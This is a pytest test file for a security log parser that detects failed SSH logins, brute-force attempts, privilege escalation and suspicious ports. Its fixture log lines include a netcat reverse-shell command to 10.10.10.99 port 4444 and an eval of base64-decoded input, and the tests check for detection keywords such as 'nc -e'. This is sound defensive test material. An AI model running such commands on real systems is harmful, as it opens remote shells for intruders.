import pytest
from sweepbot.log_parser import (
    check_line,
    detect_brute_force,
    build_report,
    BRUTE_FORCE_THRESHOLD,
)


# ── check_line ────────────────────────────────────────────────────────────────

def test_detects_failed_password():
    line = "Mar 15 08:05:11 webserver sshd[1260]: Failed password for root from 198.51.100.23 port 41221 ssh2"
    flags = check_line(1, line)
    assert any(f["rule"] == "failed_ssh" for f in flags)


def test_detects_authentication_failure():
    line = "Mar 15 08:15:00 webserver sshd[1320]: pam_unix(sshd:auth): authentication failure; logname= uid=0 rhost=91.108.4.1"
    flags = check_line(1, line)
    assert any(f["rule"] == "failed_ssh" for f in flags)


def test_detects_privilege_escalation_not_in_sudoers():
    line = "Mar 15 09:05:00 webserver sudo: www-data : user NOT in sudoers ; TTY=? ; COMMAND=/bin/bash"
    flags = check_line(1, line)
    assert any(f["rule"] == "privilege_escalation" for f in flags)


def test_detects_privilege_escalation_sudo_command():
    line = "Mar 15 08:25:00 webserver sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/bin/bash"
    flags = check_line(1, line)
    assert any(f["rule"] == "privilege_escalation" for f in flags)


def test_command_bin_bash_not_double_flagged_when_priv_esc_matches():
    # sudo.*COMMAND= already covers this — no redundant keyword entry
    line = "Mar 15 08:25:00 webserver sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/bin/bash"
    flags = check_line(1, line)
    rules = [f["rule"] for f in flags]
    assert rules.count("keyword:COMMAND=/bin/bash") == 0
    assert "privilege_escalation" in rules


def test_command_bin_bash_flagged_as_keyword_outside_sudo_context():
    line = "Mar 15 10:00:00 webserver bash[9990]: spawning COMMAND=/bin/bash for session"
    flags = check_line(1, line)
    assert any(f["rule"] == "keyword:COMMAND=/bin/bash" for f in flags)


def test_detects_malicious_port_4444():
    line = "Mar 15 08:31:00 webserver kernel: [UFW BLOCK] SRC=203.0.113.99 DST=10.0.1.1 DPT=4444"
    flags = check_line(1, line)
    assert any(f["rule"] == "malicious_port_4444" for f in flags)


def test_detects_malicious_port_31337():
    line = "Mar 15 08:50:00 webserver kernel: [UFW BLOCK] SRC=45.33.32.200 DST=10.0.1.1 DPT=31337"
    flags = check_line(1, line)
    assert any(f["rule"] == "malicious_port_31337" for f in flags)


def test_normal_port_not_flagged():
    # SSH source port 52143 should not trigger the malicious port rule
    line = "Mar 15 07:45:01 webserver sshd[1100]: Accepted publickey for deploy from 10.0.1.5 port 52143 ssh2"
    flags = check_line(1, line)
    assert not any("malicious_port" in f["rule"] for f in flags)


def test_detects_keyword_reverse_shell():
    line = "Mar 15 10:00:00 webserver bash[9999]: spawning reverse shell to attacker"
    flags = check_line(1, line)
    assert any(f["rule"] == "keyword:reverse shell" for f in flags)


def test_detects_keyword_nc_e():
    line = "Mar 15 08:30:05 webserver sudo: eve : COMMAND=/bin/nc -e /bin/bash 10.10.10.99 4444"
    flags = check_line(1, line)
    assert any(f["rule"] == "keyword:nc -e" for f in flags)


def test_detects_keyword_base64_decode():
    line = "Mar 15 10:05:00 webserver bash[9998]: eval $(echo dXNlcm5hbWU= | base64 decode)"
    flags = check_line(1, line)
    assert any(f["rule"] == "keyword:base64 decode" for f in flags)


def test_clean_line_returns_no_flags():
    line = "Mar 15 07:45:01 webserver sshd[1100]: Accepted publickey for deploy from 10.0.1.5 port 52143 ssh2"
    assert check_line(1, line) == []


def test_entry_includes_source_ip():
    line = "Mar 15 08:05:11 webserver sshd[1260]: Failed password for root from 198.51.100.23 port 41221 ssh2"
    flags = check_line(1, line)
    assert flags[0]["source_ip"] == "198.51.100.23"


def test_entry_includes_timestamp():
    line = "Mar 15 08:05:11 webserver sshd[1260]: Failed password for root from 198.51.100.23 port 41221 ssh2"
    flags = check_line(1, line)
    assert flags[0]["timestamp"] == "Mar 15 08:05:11"


def test_entry_includes_original_line():
    line = "Mar 15 08:05:11 webserver sshd[1260]: Failed password for root from 198.51.100.23 port 41221 ssh2"
    flags = check_line(1, line)
    assert flags[0]["line"] == line


def test_entry_includes_line_number():
    line = "Mar 15 08:05:11 webserver sshd[1260]: Failed password for root from 198.51.100.23 port 41221 ssh2"
    flags = check_line(42, line)
    assert flags[0]["line_number"] == 42


# ── detect_brute_force ────────────────────────────────────────────────────────

def _failed_lines(ip: str, count: int, start: int = 1) -> list[tuple[int, str]]:
    return [
        (
            start + i,
            f"Mar 15 08:{(start + i):02d}:00 webserver sshd[{1000 + i}]: "
            f"Failed password for root from {ip} port {40000 + i} ssh2",
        )
        for i in range(count)
    ]


def test_brute_force_detected_above_threshold():
    lines = _failed_lines("198.51.100.23", BRUTE_FORCE_THRESHOLD + 1)
    result = detect_brute_force(lines)
    assert "198.51.100.23" in result
    assert len(result["198.51.100.23"]) == BRUTE_FORCE_THRESHOLD + 1


def test_brute_force_not_detected_at_threshold():
    # Exactly at the threshold means equal to, not greater than — should not flag
    lines = _failed_lines("10.0.0.1", BRUTE_FORCE_THRESHOLD)
    assert "10.0.0.1" not in detect_brute_force(lines)


def test_brute_force_not_detected_below_threshold():
    lines = _failed_lines("10.0.0.2", 3)
    assert "10.0.0.2" not in detect_brute_force(lines)


def test_brute_force_isolates_by_ip():
    lines = _failed_lines("1.2.3.4", 2) + _failed_lines("5.6.7.8", BRUTE_FORCE_THRESHOLD + 2, start=10)
    result = detect_brute_force(lines)
    assert "1.2.3.4" not in result
    assert "5.6.7.8" in result


def test_brute_force_line_numbers_are_correct():
    lines = _failed_lines("9.9.9.9", BRUTE_FORCE_THRESHOLD + 1, start=5)
    result = detect_brute_force(lines)
    assert result["9.9.9.9"][0] == 5
    assert result["9.9.9.9"][-1] == 5 + BRUTE_FORCE_THRESHOLD


# ── build_report ──────────────────────────────────────────────────────────────

def test_build_report_has_required_keys(tmp_path):
    log = tmp_path / "test.log"
    log.write_text(
        "Mar 15 08:05:11 webserver sshd[1260]: Failed password for root from 198.51.100.23 port 41221 ssh2\n"
        "Mar 15 08:07:30 webserver sshd[1280]: Accepted publickey for deploy from 10.0.1.5 port 52200 ssh2\n"
    )
    report = build_report(str(log))
    for key in ("file", "total_lines", "flagged", "entries", "rule_counts"):
        assert key in report


def test_build_report_total_lines_count(tmp_path):
    log = tmp_path / "test.log"
    log.write_text("line one\nline two\nline three\n")
    report = build_report(str(log))
    assert report["total_lines"] == 3


def test_build_report_counts_failed_ssh_and_brute_force(tmp_path):
    log = tmp_path / "test.log"
    log.write_text(
        "\n".join(
            f"Mar 15 08:{i:02d}:00 webserver sshd[{1000+i}]: "
            f"Failed password for root from 198.51.100.23 port {40000+i} ssh2"
            for i in range(1, BRUTE_FORCE_THRESHOLD + 2)
        )
        + "\n"
    )
    report = build_report(str(log))
    assert report["rule_counts"]["failed_ssh"] == BRUTE_FORCE_THRESHOLD + 1
    assert report["rule_counts"]["brute_force"] == 1


def test_build_report_clean_log_has_no_flags(tmp_path):
    log = tmp_path / "test.log"
    log.write_text(
        "Mar 15 07:45:01 webserver sshd[1100]: Accepted publickey for deploy from 10.0.1.5 port 52143 ssh2\n"
        "Mar 15 07:52:33 webserver sshd[1115]: Accepted password for admin from 192.168.1.22 port 43821 ssh2\n"
    )
    report = build_report(str(log))
    assert report["flagged"] == 0
    assert report["entries"] == []


def test_build_report_entries_sorted_by_line_number(tmp_path):
    log = tmp_path / "test.log"
    log.write_text(
        "Mar 15 08:31:00 webserver kernel: [UFW BLOCK] SRC=1.2.3.4 DST=10.0.1.1 DPT=4444\n"
        "Mar 15 08:05:11 webserver sshd[1260]: Failed password for root from 5.6.7.8 port 41221 ssh2\n"
    )
    report = build_report(str(log))
    line_numbers = [e["line_number"] for e in report["entries"]]
    assert line_numbers == sorted(line_numbers)
